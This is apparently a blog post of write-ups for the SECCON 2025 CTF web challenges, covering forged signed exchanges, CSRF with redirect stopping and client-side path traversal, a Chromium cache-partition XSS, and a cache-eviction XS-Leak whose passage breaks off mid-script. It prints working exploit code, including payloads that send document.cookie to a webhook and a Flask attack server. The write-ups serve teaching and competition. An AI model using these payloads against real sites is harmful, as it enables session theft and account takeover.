---
layout: post
title: SECCON CTF 2025 Writeups (Web)
description: >
  In this blog post we will discuss the solutions for SECCON 2025 Web category.
sitemap: false
hide_last_modified: true
---

I played SECCON this year with mörger which, as the name might suggest, was a merger between my team AresX and Zer0RocketWrecks.

I think the authors this year found a very good balance in creating challenges which were conceptually easy to understand but difficult to solve. The best challenges are always those with very little source code/noise but incredibly clever solutions.

Thanks to satoooon, RyotaK and Ark for putting together the web challenges. In the end, we only managed to solve half of the challenges but I will include a writeup for all of them because they were all really interesting!

## web/broken-challenge
### Initial Observations

Starting off, we open up the archive and can immediately see we have a directory for a "bot". Opening up the source we can see where the flag gets stored:

```javascript
await context.setCookie({
      name: "FLAG",
      value: flag.value,
      domain: "hack.the.planet.seccon",
      path: "/",
    });
```

I think this is a good example of why it's important (even when it may be obvious) to check where and how the flag is stored. Above we can see pretty quickly that the flag is set to `hack.the.planet.seccon` which is clearly not going to match the domain the web app is hosted... Speaking of which, where the hell is the web app?!

### Web App

There is no accompanying web application with this challenge. After discovering this, I turned my attention back towards the bot source code. That's where I saw something interesting.

```javascript
app.get("/hint", (req, res) => {
  res.render("hint", {
    hint: fs.readFileSync("./cert.key"),
  });
});
```

The hint endpoint gives us the value of the `cert.key` file! I opened this on the remote but was disappointed to be greeted with "nope". The file only gets passed into the template as a variable.

```html
<!DOCTYPE html>
<html data-theme="light">
  <head>
    <title>Hint</title>
  </head>
  <body>
    <p>nope</p>
    <div style="opacity: 0;"><%= hint %></div>
  </body>
</html>
```

But it does get rendered; just hidden. Inspecting the response we can recover the key:

```key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIDXSM3v5wDSRra/TS/InNmXoVWqm4W/HsWyJ5qzqk0lUoAoGCCqGSM49
AwEHoUQDQgAElm1pmadguVhutPv6LdLuQke8b3iTpaGBIdmc5ta9/WLs1GtFV2K5
wGUkCtk/c9u1e64FKrqqHva6JMAJFafgOw==
-----END EC PRIVATE KEY-----
```

Okay so we have this "private key" but what exactly is this? The source code also gives us the public key.

```
-----BEGIN CERTIFICATE-----
MIIBizCCATCgAwIBAgIUbjrJ6hhsPbR+q3b8T6k3HkFyOEwwCgYIKoZIzj0EAwIw
ETEPMA0GA1UEAwwGc2VjY29uMB4XDTI1MTEzMDA5MTk1NloXDTM1MTEyODA5MTk1
NlowETEPMA0GA1UEAwwGc2VjY29uMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE
lm1pmadguVhutPv6LdLuQke8b3iTpaGBIdmc5ta9/WLs1GtFV2K5wGUkCtk/c9u1
e64FKrqqHva6JMAJFafgO6NmMGQwHQYDVR0OBBYEFDodm68MB38A8T2XQBNFvbqd
m0UNMB8GA1UdIwQYMBaAFDodm68MB38A8T2XQBNFvbqdm0UNMBIGA1UdEwEB/wQI
MAYBAf8CAQAwDgYDVR0PAQH/BAQDAgEGMAoGCCqGSM49BAMCA0kAMEYCIQCDgCwj
OhKsCL0k3BQMLjpmIRLolYE9hIB9UQB7lEMlJAIhAM3Rujzc1PfYeejf/cZE+KFB
UbPgcyNGemJdufTNUF1z
-----END CERTIFICATE-----
```

Looking at the `Dockerfile` we can see a reference to the certificate appearing.
```Dockerfile
RUN mkdir -p /home/pptruser/.pki/nssdb \

    && certutil -A -d "sql:/home/pptruser/.pki/nssdb" -n "seccon" -t "CT,c,c" -i ./cert.crt
```

The path now becomes clear. The bot imports our certificate into its NSS database, effectively trusting it as a root certificate authority for SSL/TLS connections. This is the same mechanism used when installing tools like Burp Suite for intercepting HTTPS traffic.

## Signed Exchanges (SXG)

This is a rather interesting technology. It enables a web server to serve content from any origin by packaging a full HTTP response into a single file and cryptographically signing it using the origin server's private key.

There may be some confusion here because we do not have the private key for `hack.the.planet.seccon` but rather we have the private key for a trusted root CA. This means we can sign a certificate that is valid for `hack.the.planet.seccon` and then use that certificate to create a signed exchange for whatever response we want. The only issue left now is implementation details.

## Online Certificate Status Protocol (OCSP)

As previously alluded to, SXG enables us to host content for a specific origin on any origin we want. So, how does the browser implement this to ensure integrity?

The solution lies in OCSP. Once the browser parses the SXG response, it will retrieve the target URL which the resource is claiming to be from. It then reads the accompanying certificate URL.

The certificate URL must be served over HTTPS and provide a CBOR-encoded certificate chain that authorizes a specific certificate (key) to sign SXGs for the claimed origin.

## Implementation

Okay now it's time to put this all together and set solve the challenge.

We'll begin with the two files we already recovered above, namely the `cert.crt` and `cert.key` files.

```bash
openssl ecparam -genkey -name prime256v1 -out new.key
```

Firstly, we must generate a new private key as displayed above. This is the key we will later use to sign the malicious SXG.

```toml
[req]
prompt = no
distinguished_name = dn
req_extensions = v3_req

[dn]
CN = hack.the.planet.seccon

[v3_req]
basicConstraints = CA:FALSE
keyUsage = digitalSignature
subjectAltName = DNS:hack.the.planet.seccon,IP:<ip>
1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL
```

We save the above as our `leaf.cnf` file for later use. Make sure to replace `<ip>` with the IP address of the server you plan to use. The OID portion of the above configuration grants the certificate access to the `CanSignHttpExchanges` extension which is a requirement for browsers to load SXG files.

```bash
openssl req -new -key new.key -out leaf.csr -config leaf.cnf
```

Above we generate a Certificate Signing Request (CSR) using the new private key we created and the configuration for the certificate. 

```bash
openssl x509 -req -in leaf.csr -CA cert.crt -CAkey cert.key -CAcreateserial -out leaf.crt -days 90 -extensions v3_req -extfile leaf.cnf -sha256
```

Next we use the CSR to generate the certificate, signing it with the original `cert.crt` and `cert.key` files obtained at the beginning.

Typically we would rely on an OCSP server to actually carry out the next stage, but for simplicity we can just manually handle it.

```bash
SERIAL=$(openssl x509 -in leaf.crt -serial -noout | cut -d= -f2)
printf "V\t251231235959Z\t\t%s\tunknown\t/CN=$TARGET_DOMAIN\n" "${SERIAL}" > index.txt
```

This will store the data needed to mint a valid OCSP response for this certificate in the `index.txt` file.

```bash
openssl ocsp -issuer cert.crt -cert leaf.crt -reqout leaf.req
```

Above we have generated the OCSP request and stored it into the `leaf.req` file.

```bash
openssl ocsp -index index.txt \
-rsigner cert.crt -rkey cert.key \
-CA cert.crt \
-reqin leaf.req \
-respout leaf.ocsp \
-ndays 7 \
-noverify
```

Finally we generate the OCSP data and store it into the `leaf.ocsp` file.

```bash
cat leaf.crt cert.crt > fullchain.pem
```

We create the full chain for the leaf certificate and the trusted certificate. We will use this to create the final CBOR file.

```bash
gen-certurl -pem fullchain.pem -ocsp leaf.ocsp > cert.cbor
```

You will need to install `gen-certurl` from [go/signedexchange](https://github.com/WICG/webpackage/blob/main/go/signedexchange/README.md) before running the above command. You will also need `gen-signedexchange` from the same place.

Next, we will host our XSS payload.

```html
<script>top.location = `<webhook_url>/${btoa(document.cookie)}`;</script>
```

Naturally, you should replace `webhook_url` with your own.

```bash
gen-signedexchange \
  -uri https://hack.the.planet.seccon/ \
  -content exploit.html \
  -certificate leaf.crt \
  -privateKey new.key \
  -certUrl https://<ip>/cert.cbor \
  -validityUrl https://hack.the.planet.seccon/resource.validity.msg \
  -o exploit.sxg

```

The final step is to generate the SXG file. Replacing `<ip>` with your own host.

For simplicity, I decided to host the CBOR and SXG on the same application. The CBOR must be served over HTTPS and so we need to serve them over a basic HTTPS server.

```nginx
:443 {
        tls ./leaf.crt ./new.key

        @sxg path /exploit.sxg
        handle @sxg {
                header Content-Type "application/signed-exchange;v=b3"
                header X-Content-Type-Options "nosniff"
                file_server
        }

        @cbor path /cert.cbor
        handle @cbor {
                header Content-Type "application/cert-chain+cbor"
                file_server
        }
}
```

We can save the above `Caddyfile` to serve this purpose. The strict `Content-Type` and `X-Content-Type-Options` response headers are a requirement for SXG to work.

```bash
sudo caddy run --config ./Caddyfile --adapter caddyfile
```

After running this and passing in `https://<ip>/exploit.sxg` to the admin bot, we get a callback to our webhook containing the flag!

`SECCON{congratz_you_hacked_the_planet_521ce0597cdcd1e3}`

## Further Reading

[Sharer's World - HITCON CTF 2023 (solve)](https://gist.github.com/betrisey/d5645e5463c95ea7f1e28dcfa8d5bd02)
[Sharer's World - HITCON CTF 2023 (author's writeup)](https://blog.splitline.tw/hitcon-ctf-2023/)
[Signed Exchanges](https://web.dev/articles/signed-exchanges)
[go/signedexchange](https://github.com/WICG/webpackage/tree/main/go/signedexchange)
[Blackhat SXG Slides](https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf)
[SXG Attack Paper](https://www.ndss-symposium.org/wp-content/uploads/2025-1086-paper.pdf)
# web/dummyhole

## Initial Observations

Opening up the challenge we can see two directories; `bot` and `web` which should be pretty self explanatory.

Investigating `bot.js` we see that the `FLAG` is stored on the bot's cookie.

```javascript
await context.setCookie({
      name: 'FLAG',
      value: FLAG,
      domain: APP_HOSTNAME,
      path: '/',
    });
```

The bot accepts a `id` for a post and then visits it as seen below.

```javascript
await page.goto(`${APP_URL}/posts/?id=${encodeURIComponent(id)}`, { timeout: 10_000 });
```

Typically with XSS challenges 10 seconds would be a little bit too much time. Authors usually optimize this to save resources. We will see later on why it is a little higher than usual.

## Finding the XSS sink

Looking at the `logout.html` we see the first suspected XSS sink.

```html
<script>
    setTimeout(() => {
      const fallbackUrl = decodeURIComponent("<FALLBACK_URL>");
      if(!fallbackUrl) {
        location.href = "/";
        return;
      }
      location.href = fallbackUrl;
    }, 5000);
    
    const postId = decodeURIComponent("<POST_ID>");
    location.href = postId ? `/posts/?id=${postId}` : "/";
  </script>
```

We have a definition for a function to execute after 5 seconds. This function reads a `<FALLBACK_URL>` and URL decodes it. If it is not defined, it will redirect to `/` but otherwise it will redirect to our `fallbackUrl` as defined. So where does this come from?

```javascript
app.post('/logout', requireAuth, (req, res) => {
  const sessionId = req.cookies.session;
  sessions.delete(sessionId);
  res.clearCookie('session');

  const post_id = req.body.post_id?.length <= 128 ? req.body.post_id : '';
  const fallback_url = req.body.fallback_url?.length <= 128 ? req.body.fallback_url : '';

  const logoutPage = path.join(__dirname, 'public', 'logout.html');
  const logoutPageContent = fs.readFileSync(logoutPage, 'utf-8')
    .replace('<POST_ID>', encodeURIComponent(post_id))
    .replace('<FALLBACK_URL>', encodeURIComponent(fallback_url));
    
  res.send(logoutPageContent);
});
```

As seen above, the `fallback_url` is defined from `req.body.fallback_url` provided the URL is less than 128 characters in length. This means it is read from the body of a POST request. If we can control this value, then we can abuse javascript URI scheme to get XSS.

Since this endpoint has no CSRF protections, something like the payload below *should* work.

```html
<form action="http://web:80/logout" method="POST">
<input name="fallback_url" value="javascript:alert()">
<input type="submit" id="btn">
</form>
<script>document.getElementById("btn").click();</script>
```

## Stopping Redirects

If you had a keen eye, you might have noticed already that the redirect happens 5 seconds after we visit the page. Unfortunately, another redirect happens prior to this.

```javascript
const postId = decodeURIComponent("<POST_ID>");
location.href = postId ? `/posts/?id=${postId}` : "/";
```

This is a redirect to `<POST_ID>` which we again have control over. This time though we only inject into a GET parameter and so we can't initiate the javascript URI for XSS. Even if left undefined, this redirect will still take place and our XSS through `<FALLBACK_URL>` will never execute.

The challenge here should be pretty clear; we want to stop the redirect from happening so it hits our fallback URL instead. So, how can we do that? There's actually a few ways. One such way is to flood the connection pool.

## Connection Pool Flooding

Connection pools are the dark arts of client side exploitation. Incredibly useful and very mysterious! The idea here is that a redirect requires sending a request to a remote origin (which uses a socket) whereas javascript URI does not. As such, if we can exhaust the connection pool, we could prevent the request from taking place!

```html
<form action="http://localhost:80/logout" method="POST" target="_BLANK">
<input name="fallback_url" value="javascript:alert()">
<input name="post_id" value="1">
<input type="submit" id="btn">
</form>
<script>
  window.open("/flood.html");
  function a() {
    document.getElementById("btn").click();
  }
  setTimeout(a, 2000);
</script>
```

The idea above is pretty simple. We modify our exploit payload to open `/flood.html` in a new window. We also modified the form to get `target="_BLANK"` which isn't really needed but was handy for testing the connection pools.

Here we wait 2 seconds before submitting the form, which gives our new window a chance to load and exhaust the sockets.

```html
<script>
  for(var i = 0; i < 254; i++) {
    fetch(`http://${i}.yourserver.com/sleep/6000`, {
      mode: "no-cors",
      cache: "no-store"
    });
  }
</script>
```

The contents of `flood.html` simply send a request to `yourserver.com` where you should be hosting an endpoint which sleeps for 6000ms. I tried a few different values and eventually this seemed to hit the sweet spot. We want to keep it under 10 seconds so there is time for the rest of the payload, as the bot only visits for that length of time.

This works but there is actually a simpler solution which avoids connection pools and when you have an opportunity to avoid messing with connection pools, **TAKE IT**! 😂

## Dangling Markup Protection

Chromium contains a protection against dangling markup attacks; if it detects a client-side redirect with `<` and either `\n`, `\r` or `\t` in the same URL then the browser will block the request.

```html
<form action="http://localhost:80/logout" method="POST">
<input name="fallback_url" value="javascript:alert()">
<input name="post_id" id="inject" value="">
<input type="submit" id="btn">
</form>
<script>
  document.getElementById("inject").value = "\x09<";
  document.getElementById("btn").click();
</script>
```

As you can see above, we use javascript to populate the `post_id` parameter with a tab followed by the opening angle bracket. This triggers the protection and the redirect is killed.

## CSPT -> Redirect

So, we have our XSS working; provided the bot visits our URL. Unfortunately, we can only give the bot a post ID. Looking at the javascript on the posts page, we see something interesting.

```javascript
const postId = params.get('id');
...
const postData = await import(`/api/posts/${postId}`, { with: { type: "json" } });
...
const imageUrl = `${location.origin}${postData.default.image_url}`;
document.getElementById('imageFrame').src = imageUrl;
```

The id which is provided will control where posts get imported from. There is a pretty clear Client-Side Path Traversal vulnerability here. This means we can prepend our `postId` with `../../` and then control the exact path it reads the JSON from.

If we can control this JSON, then we can control the `postData.default.image_url` portion of `imageURL` which gives us full control over the website loaded. `location.origin` is just the domain name which would be `example.com` so if we append `ourwebsite.com` then this would become `example.com.ourwebsite.com` which we control!

>Note that we can't use `@outwebsite.com` here because subresource requests **cannot** contain embedded credentials.

So, how do we host our own JSON?

## Uploading JSON

When looking for a way to host our own JSON on the application, we first obviously check the file upload functionality.

```javascript
app.post('/upload', checkOrigin, requireAuth, uploadLimiter, upload.single('image'), async (req, res) => {
  try {
    const { title, description } = req.body;
    const file = req.file;

    if (!file || !title) {
      return res.status(400).json({ error: 'Image and title required' });
    }

    if (!file.mimetype || (!file.mimetype.startsWith('image/png') && !file.mimetype.startsWith('image/jpeg'))) {
      return res.status(400).json({ error: 'Invalid file: must be png or jpeg' });
    }

    const postId = uuidv4();

    const command = new PutObjectCommand({
      Bucket: BUCKET,
      Key: postId,
      Body: file.buffer,
      ContentType: file.mimetype,
    });

    await s3Client.send(command);

    posts.set(postId, {
      title,
      description: description || '',
      image_url: `/images/${postId}`,
      author: req.user,
    });

    res.json({ success: true, id: postId });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ error: 'Upload failed' });
  }
});
```

What is worth noting here is that the only check is against the mimetype. Aside from this, we can host whatever we want. However, strict mime checking is enforced for module scripts

```javascript
app.get('/images/:id', async (req, res) => {
  try {
    const id = req.params.id;

    const command = new GetObjectCommand({
      Bucket: BUCKET,
      Key: id,
    });

    const response = await s3Client.send(command);

    res.setHeader('Content-Type', response.ContentType || 'application/octet-stream');
    res.setHeader('Content-Security-Policy', "default-src 'none'; form-action 'none';");

    const stream = response.Body;
    stream.pipe(res);
  } catch (error) {
    console.error('Image fetch error:', error);
    res.status(404).json({ error: 'Image not found' });
  }
});
```

As you can see, the content type is being saved and when we visit the `/images/:id` endpoint we get the same content type returned as the one specified in the mime type when uploading. So, what is a valid mimetype?

>A JSON MIME type is any [MIME type](https://mimesniff.spec.whatwg.org/#mime-type) whose [subtype](https://mimesniff.spec.whatwg.org/#subtype) ends in "`+json`" or whose [essence](https://mimesniff.spec.whatwg.org/#mime-type-essence) is "`application/json`" or "`text/json`".

So we can upload a file with mimetype set to `image/png+json` and this will work!

```http
POST /upload HTTP/1.1
Host: localhost
Content-Length: 474
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynZuTFBeWRsBukMgO
Cookie: session=<snip>
Connection: keep-alive

------WebKitFormBoundarynZuTFBeWRsBukMgO
Content-Disposition: form-data; name="title"

test
------WebKitFormBoundarynZuTFBeWRsBukMgO
Content-Disposition: form-data; name="description"

test
------WebKitFormBoundarynZuTFBeWRsBukMgO
Content-Disposition: form-data; name="image"; filename="image.png"
Content-Type: image/png+json

{
    "title": "test",
    "description": "test",
    "image_url": ".ourwebsite.com"
}
------WebKitFormBoundarynZuTFBeWRsBukMgO--
```

This will return a uuid for the image. When we now visit `/posts/?id=../../images/<uuid>` we will load `<origin>.ourwebsite.com` inside of a credentialless iframe

## Credentialless iframes

Visiting the CSRF payload inside of the credentialless iframe unfortunately won't execute it. Thankfully, there's a rather easy bypass here. We just call `window.open("/csrf.html")` and it will run inside of a new window with credentials.

## Tying it all together

We begin by registering an account and logging in. Then we upload an image with mimetype `image/png+json` with our payload.

```json
{
    "title": "test",
    "description": "test",
    "image_url": ".ourwebsite.com"
}
```

Then we visit the bot page and send it to `../../images/<uuid>` to retrieve the flag.

```html
<script>
  window.open("/exploit.html");
</script>
```

Our index page simply opens `exploit.html` in a new window.

```html
<form action="http://web:80/logout" method="POST">
<input name="fallback_url" value="javascript:fetch(`http://<webhook>/${btoa(document.cookie)}`)">
<input name="post_id" id="inject" value="">
<input type="submit" id="btn">
</form>
<script>
  document.getElementById("inject").value = "<\x09";
  document.getElementById("btn").click();
</script>
```

Our `exploit.html` contains the full CSRF exploit with the redirect stopping logic.

`SECCON{why_c4nt_we_eat_the_d0nut_h0le}`

## Further Reading

[Critical Thinking - Stopping Redirects](https://lab.ctbb.show/research/stopping-redirects)
[Dangling Markup Protection](https://chromestatus.com/feature/5735596811091968)
[MIME Sniffing Spec](https://mimesniff.spec.whatwg.org/#:~:text=A%20JSON%20MIME%20type%20is,or%20%22%20text%2Fjson%20%22.)
[XSLeaks - Connection Pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

# web/framed-xss

## Initial Observations

Opening up the source code we see a directory for `bot` and `web` applications. Looking at the bot, we can see that the flag is stored in a cookie.

```javascript
await context.setCookie({
      name: "FLAG",
      value: flag.value,
      domain: challenge.appUrl.hostname,
      path: "/",
    });
```

We provide an arbitrary `url` to the bot and it will visit. It seems like we need to find an XSS.

## Finding the XSS sink

The main page has the following javascript. This send a fetch to `/view` and stores the response into the `srcdoc` of a new `iframe` element. The `iframe` element has a sandbox which prevents any scripts from executing.

```javascript
const html = await fetch("/view" + location.search, {
      headers: { "From-Fetch": "1" },
    }).then((r) => r.text());
    if (html) {
      document.forms[0].html.value = html;
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "");
      iframe.srcdoc = html;
      document.body.append(iframe);
    }
```

The `From-Fetch` header is defined here, which is needed to interact with the endpoint.

```javascript
@app.get("/view")
def view():
    if not request.headers.get("From-Fetch", ""):
        return "Use fetch", 400
    return request.args.get("html", "")
```

If the header is defined, then we have a free XSS sink.

## Triggering the XSS

Playing around with this, I noticed the following flow.

* Visit `/view?html=<XSS>`
* Visit `/?html=<XSS>`
* `history.back()`

So why does this happen? Well it's because of browser cache! When we visit `/?html=<XSS>` it send a fetch to `/view?html=<XSS>` which resulted in the response getting cached in our browser. Then when we navigated back in the history, it fetched this entry from cache and loaded it! So we can trigger the XSS without having to pass the header.

Now we just have to automate this exploit to target the bot which is where the real challenge surfaces.

##  Disk Cache

To understand how we can automate this, we first have to understand the underlying mechanism and why the above procedure results in XSS. This challenge uses Chromium and so I will be explaining how this works with Chromium internals so keep in mind that this might differ for other browsers.

When visiting websites we often encounter the same files on multiple pages. It could be a website logo or some javascript library they load from the same CDN; content is repeated a lot. Naturally there is huge benefit to be had from implemented a caching mechanism. In browsers this is known as disk cache.

Due to concerns around XS Leaks and whatnot, there must be isolation between cached resources across origins. We don't want a cross-origin website to be able to detect if a certain resource is cached or not as that could provide some oracle for leaking information about a user's session on another application.

To address this, Chromium introduced a split HTTP disk cache. When split cache is enabled, cache entries are “double-keyed” by prefixing the URL with `_dk_` followed by a serialized Network Isolation Key (derived from the top-frame site and frame site), optionally additional navigation prefixes, and then the resource URL.

If our top-level frame is `example.com` and it is framing `youtube.com` then a resource for `https://youtube.com/favicon.ico` cached from `youtube.com` will have a key that looks something like: `_dk_https://example.com https://youtube.com https://youtube.com/favicon.ico`

*This is slightly inaccurate but it gets across the general idea*.

## The mark of cn_

```javascript
if (initiator.has_value() && is_mainframe_navigation) {
	const bool is_initiator_cross_site = !net::SchemefulSite::IsSameSite(*initiator, url::Origin::Create(url));
	if (is_initiator_cross_site) {
		is_cross_site_main_frame_navigation_prefix = kCrossSiteMainFrameNavigationPrefix;
	}
}
```

The above piece of code shows us the requirements for the `cn_` prefix to be added. If this were added it would appear after `_dk_` above giving us a prefix that looks like `_dk_cn_` when all of the following conditions are satisfied.

* Initiator is defined
* Request is a mainframe navigation
* The initiator is cross-site

The `cn_` prefix partitions the HTTP disk cache so that responses obtained through cross-site main-frame navigations are stored separately from same-site and non-navigation requests, reducing the risk of cross-site disk cache poisoning.

## Initiator null

You might notice the first requirement is for the `initiator` to be defined. An initiator is null whenever we begin a fresh navigation such as typing a URL into an address bar.

As we browse the web clicking on links and getting client-side redirects our initiator keeps changing to the previous page which initiated the navigation. One important caveat here is that 3XX redirects do **NOT** modify the value of the initiator. What this means is that if I type a URL into my address bar and it redirects me to another website *my initiator is still null*.

When we run `history.back()` our browser must also recover the initiator. If we first navigate to `google.com` we will have a null initiator. If we then visit `youtube.com` our initiator will be set as `google.com` but if press the back button in the browser it will return us to `google.com` with the initiator set back to the `null` value.

Let's now explain this in the context of the challenge. We originally visited `/view?html=<XSS>` which stored a disk cache entry for our navigation. Because this was a fresh, browser-initiated main-frame navigation, the initiator was null, and the cache entry was therefore created without the `cn_` prefix. Afterwards, we visited `/?html=<XSS>` which fetched `/view?html=<XSS>` and as this is not a mainframe navigation it also didn't use the `cn_` prefix and so it updated the previous cache entry with the payload. When we ran `history.back()` we recovered the null initiator and thus loaded the resource containing the payload.
## Exploiting

Now that we understand the internals of how the caching mechanism works; it's time to come up with a plan to exploit this!

We must accomplish two things for this to work:

* Get the bot to visit `/?html=<XSS>` to populate the cache
* Visit `/view?html=<XSS>` with initiator set to `null

The solution to this is the following sequence of events:

* Visit our website (initiator will be `null`)
* Do a `window.open()` to `/?html=<XSS>` to populate cache
* Redirect top-level to another page storing initiator null in history
* Trigger a `history.back()` to recover the null initiator
* This time serve a redirect to `/view?html=<XSS>`

> We'll need to serve a `Cache-Control: no-store` so our call to `history.back()` serves the redirect and not disk cache or bfcache.

```python
from flask import Flask, request, redirect

app = Flask(__name__)

counter = 1
PAYLOAD = "<img src=x onerror=fetch(`https://webhook.site/<snip>/${btoa(document.cookie)}`)>"
TARGET = f"http://localhost:3000"


@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response



@app.get("/")
def index():
    global counter
    counter += 1
    
    if counter % 2 == 0:
        return f"""
        <script>
          var w = window.open("{TARGET}/?html={PAYLOAD.replace('`', '%60').replace('{', '%7B').replace('}', '%7D').replace('<', '%3C').replace('>', '%3E')}", "_blank");
          
          function a() {{ 
            window.location = "/back";
          }}

          setTimeout(a, 2000);
        </script>
        """.strip()
    else:
        return redirect(f"{TARGET}/view?html={PAYLOAD}")


@app.get("/back")
def back():
    return """
    <script>
      function a() {
        window.history.back();
      }
      setTimeout(a, 1000);
    </script>
    """


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)

```

Above is my solution script. One interesting observation was having to replace the `window.open` call to use ``PAYLOAD.replace('`', '%60').replace('{', '%7B').replace('}', '%7D').replace('<', '%3C').replace('>', '%3E')`` which was necessary because the top-level navigation URL encoded these but the request to `fetch()` did not. This resulted in a mismatched cache key and so to trigger the vulnerability it was necessary to URL encode these values to match.

`SECCON{New_fe4tur3,n3w_bypa55}`

## Further Reading

[SVART BOARD - icesfont](https://gist.github.com/icesfont/a38cf323817a75d61e0612662c6d0476)
[Cache Partitioning Discussion](https://groups.google.com/a/chromium.org/g/blink-dev/c/ZpyP6jjCUJE)
[Relevant Chromium Source](https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_cache.cc;drc=f7ba4f30a3517d40d3698a0afa686720b4db87e2;l=760)
[Browser Spec](https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching)
[Feature Slides](https://docs.google.com/presentation/d/1StMrI1hNSw_QSmR7bg0w3WcIoYnYIt5K8G2fG01O0IA/edit?slide=id.g2f87bb2d5eb_0_4#slide=id.g2f87bb2d5eb_0_4)

## web/impossible-leak

## Initial Observations

Opening up the challenge source we see two directories; `web` and `bot` again.

```javascript
const page1 = await context.newPage();
await page1.goto(challenge.appUrl, { timeout: 3_000 });
await page1.waitForSelector("#create");
await page1.type("#create input[name=note]", flag.value);
await page1.click("#create input[type=submit]");
await sleep(1_000);
await page1.close();
await sleep(1_000);

// Visit the given URL
const page2 = await context.newPage();
await page2.goto(url, { timeout: 3_000 });
await sleep(60_000);
await page2.close();
```

This time the bot performs a few actions. It will visit the challenge URL and create a note. Then it will close the page and open a new page where it visits a `url` provided by the attacker. Then it will sleep for 60 seconds. 60 seconds is far too long for typical XSS attacks so it's a strong hint towards XS-Leaks.

```javascript
import express from "express";
import session from "express-session";
import crypto from "node:crypto";

const db = new Map();
const getNotes = (id) => {
  if (!db.has(id)) db.set(id, []);
  return db.get(id);
};

const app = express()
  .set("view engine", "ejs")
  .use(express.urlencoded())
  .use(
    session({
      secret: crypto.randomBytes(16).toString("base64"),
      resave: false,
      saveUninitialized: true,
    })
  );

app.get("/", (req, res) => {
  const { query = "" } = req.query;
  const notes = getNotes(req.session.id).filter((note) => note.includes(query));
  res.render("index", { notes });
});

app.post("/new", (req, res) => {
  const note = String(req.body.note).slice(0, 1024);
  getNotes(req.session.id).push(note);
  res.redirect("/");
});

app.listen(3000);
```

The full source code is really small. We can create a note by sending a POST request to `/new` where is gets stored in `db` which is a `Map` type. Subsequently we can visit the index page at `/` which takes an optional `query` GET parameter. This parameter filters the notes returned to only pass those which contain the query string.

{% raw %}
```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Notes</h1>
    <form id="create" action="/new" method="post">
      <div>
        <input type="text" name="note" required />
        <input type="submit" value="Create" />
      </div>
    </form>
    <ul>
      <% notes.forEach(note => {%>
        <li><%= note %></li>
      <% }); %>
    </ul>
    <form action="/" method="get">
      <div>
        <input type="text" name="query" />
        <input type="submit" value="Search" />
      </div>
    </form>
  </body>
</html>
```
{% endraw %}

The above template is how the notes get rendered. For each note returned from the lookup we will create a `<li>` element containing the note text. This will display the notes as bullet points on the page.

## Page Length Oracle

One of the most obvious ways to detect a successful lookup would be the response size. It will be slightly larger for successful lookups which contain the note content. I counted 442 bytes for an unsuccessful lookup compared to 467 + `flag.length` bytes for a successful response.

The size difference is relatively small but given the known flag format (`SECCON{}`) we can deduce there is at worst 475 bytes which is a total offset of 33. Could this be detected cross-origin?

## Disk Cache Oracle

One such idea is to detect disk cache evictions. We can visit `/?query=SECCON{a` hundreds of times passing in an extra GET parameter (`&t={i}`) each time. If we do this 1000 times we will get a minimum of `OFFSET*1000` bytes added into the disk cache.

That would be 33KB of extra disk cache data loaded. If we then subsequently cached some very large pages elsewhere; Chromium will surely at some point have to evict the cache. A naive approach would be to just evict the oldest cache stored. If this were to be the case then we could potentially use this as an oracle to detect a successful search. If we leave just enough room for 1000 unsuccessful page caches (442KB) but not enough for `(467+flag.length)KB` then the cache evictions will only take place if the character was successful.

>This is a simplistic explanation. In reality, caches are much bigger than the response size as they also include headers and metadata such as cache keys.

It turns out there exists two types of caches; `DISK_CACHE` and `MEMORY_CACHE` in Chromium. The former is typically larger and is most commonly used. The latter only gets used in incognito mode. Interestingly enough, the bot in this challenge appears to use `MEMORY_CACHE` which is the smaller in-memory buffer.

```javascript
const int kDefaultCacheSize = 80 * 1024 * 1024;  // 80 MB
```

As seen above the default cache baseline is 80MB and this is what gets used by the `MEMORY_CACHE` buffer.

```javascript
if (type == net::DISK_CACHE) {
#if !BUILDFLAG(IS_WIN)
  percent_relative_size = 400;
#endif
}
```

If the type is `DISK_CACHE` then the baseline memory is increase by 400% and becomes 320MB.

>Check the above block of code again. You'll notice that this increase specifically doesn't apply to Windows devices. This means they have a consistent baseline cache of 80MB across all browser sessions regardless of cache type.

The term *baseline* as used above is important. Things are never simple when browsers are involved and Chromium's disk cache algorithm is no different. It uses a heuristic approach to scale up the disk cache based on availability of resources.

What is useful for us though is that the `MEMORY_CACHE` being used in this challenge won't apply the heuristics step. Essentially this means we have a fixed-sized buffer of 80MB. Once this amount of memory is used we will begin evicting entries.

> The eviction algorithm used for both caches is much the same. The least recently used cache entry is typically the first entry available for eviction. Caches will be evicted until the number of bytes used is less than the total cache size.

## Solving

```javascript
const express = require("express");
const app = express();

app.use(express.json());

app.get("/gg", (req, res) => {
        res.send(`A`.repeat((1*1024*1024)))
});
app.get("/rr", (req, res) => {
        res.send(`A`.repeat((1024) + 128))
});
app.get("/vaaa", (req, res) => {
        console.log(req.query)
        res.send(`A`.repeat(1024))
});
app.get("/", (req, res) => {
        if(!req.query.prefix || !req.query.check) return res.send('no')
        console.log('bot')
        res.send(`
<script>
let x = window.open()
const flag = '${req.query.prefix}'
const check = '${req.query.check}'
async function df(){
        console.log('doing')
        await fetch('/rr',{cache:'force-cache'})
        for(i=0;i<49;i++) fetch('http://<snip>:5000/gg?'+i+'&'+'A'.repeat(52-flag.length),{cache:'force-cache'})
        for(i=0;i<599;i++) fetch('http://<snip>:5000/vaaa?'+i+'&'+'A'.repeat(52-flag.length),{cache:'force-cache'})
        await new Promise(r => setTimeout(r, 30000)); // sleeps for 1 second
        for(i=0;i<200;i++){
                let u = 'http://web:3000/?query='+flag+check+'&'+i+'&'
                x.location = u.padEnd(87,'A')
